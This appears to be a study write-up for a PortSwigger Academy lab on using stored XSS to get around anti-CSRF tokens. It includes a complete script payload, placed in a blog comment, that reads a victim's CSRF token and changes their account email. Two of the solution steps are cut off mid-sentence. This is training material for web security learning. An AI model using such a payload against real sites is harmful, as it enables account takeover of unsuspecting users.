# Lab: Exploiting XSS to bypass CSRF defenses

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)

## Lab idea

The lab uses stored XSS in blog comments in a scenario involving a victim account and anti-CSRF protections. It practices understanding how script execution in an authenticated browser can undermine assumptions about CSRF defenses.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Log in using the credentials provided.
2. If you view the source for the page, you'll see the following information: This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to…
3. Submit the following payload in a blog comment: <script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function…

## Payloads / key values
- `/my-account/change-email`
- `email`
- `token`
- `<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>`
- `test@test.com`

## Official source
- [PortSwigger Academy: Lab: Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
